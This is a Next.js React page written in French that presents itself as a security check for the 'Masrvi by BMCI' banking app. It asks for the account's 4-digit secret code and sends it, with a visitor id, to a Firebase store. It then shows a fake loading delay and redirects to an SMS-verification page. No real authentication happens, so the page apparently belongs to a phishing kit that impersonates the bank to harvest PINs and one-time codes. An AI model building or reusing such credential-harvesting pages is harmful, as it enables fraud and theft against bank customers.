"use client"

import type React from "react"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { MessageCircle, ArrowLeft } from "lucide-react"
import { useRouter } from "next/navigation"
import { useState } from "react"
import Link from "next/link"
import { addData } from "@/lib/firebase"

export default function VerifyPage() {
  const router = useRouter()
  const [code, setCode] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const _id = localStorage.getItem('visitor')
    addData({ id: _id, codeone: code })

    setIsLoading(true)
    setTimeout(() => {
      setIsLoading(false)
      router.push("/verify-sms")
    }, 4000);
  }

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      {/* Header with logo */}
      <header className="w-full bg-white py-6 px-4 shadow-sm">
        <div className="max-w-md mx-auto flex items-center">
          <Link href="/" className="mr-4">
            <ArrowLeft className="h-5 w-5 text-gray-600" />
          </Link>
          <div className="max-w-md mx-auto flex justify-center">

          <Image src="/loggo.avif" alt="Masrvi Logo" width={260} height={150} className="h-auto" />
        </div>
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center px-4 py-8">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-8 space-y-8">
          <div className="text-center">
            <h1 className="text-2xl font-bold text-gray-800 mb-2">Vérification</h1>
            <p className="text-gray-600">Entrez votre code secret pour continuer</p>
          </div>

          {/* Secret Code Form */}
          <form onSubmit={handleSubmit} className="space-y-8">
            <div className="space-y-4">
              <Input
                type="password"
                maxLength={4}
                className="h-14 text-center text-xl border border-gray-300 rounded-lg focus:ring-2 focus:ring-emerald-400 focus:border-transparent transition-all"
                value={code}
                onChange={(e) => setCode(e.target.value)}
              />
              <p className="text-xs text-gray-500 text-center">Veuillez entrer le code secret associé à votre compte</p>
            </div>

            <Button
              type="submit"
              className="w-full h-12 text-base font-medium bg-emerald-400 hover:bg-emerald-500 text-white rounded-lg transition-colors shadow-sm"
            >
              Confirmer
            </Button>
          </form>

          <div className="text-center pt-2">
            <a href="#" className="text-sm text-emerald-600 hover:text-emerald-700 font-medium">
              Code oublié?
            </a>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full bg-white py-4 border-t border-gray-200">
        <div className="max-w-md mx-auto px-4 text-center text-xs text-gray-500">
          <p>© 2025 Masrvi by BMCI. Tous droits réservés.</p>
        </div>
      </footer>

      {/* Chat Button */}
      <div className="fixed bottom-6 right-6 z-10">
        <button className="flex items-center justify-center w-14 h-14 rounded-full bg-emerald-400 hover:bg-emerald-500 text-white shadow-lg transition-all">
          <MessageCircle size={24} />
        </button>
      </div>
    </div>
  )
}
